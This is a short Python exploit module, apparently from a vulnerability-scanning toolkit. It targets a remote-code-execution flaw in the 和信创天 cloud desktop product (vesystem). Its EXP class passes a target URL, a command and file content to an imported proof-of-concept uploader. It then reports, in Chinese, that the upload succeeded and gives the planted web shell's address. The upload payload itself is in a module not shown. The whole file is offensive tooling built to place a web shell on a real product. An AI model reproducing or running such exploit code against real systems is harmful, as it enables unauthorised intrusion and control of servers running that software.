# -*- coding:utf-8 -*-
# 和信创天云桌面_RCE
from ServiceScanModel.models import ServiceScan
from VulnScanModel.models import VulnScan
from .vesystem_rce_poc import POC
from ..requestClass import Requests


class EXP:
    def __init__(self, vuln: VulnScan):
        self.vuln = vuln
        self.requestUtil = Requests(vuln.cookies)


    def exp(self, cmd, content=""):
        poc = POC(ServiceScan(url=self.vuln.url, cookies=self.vuln.cookies))
        return "文件上传成功，shell地址：\n%s" % poc.upload_file(self.vuln.url, cmd, content)
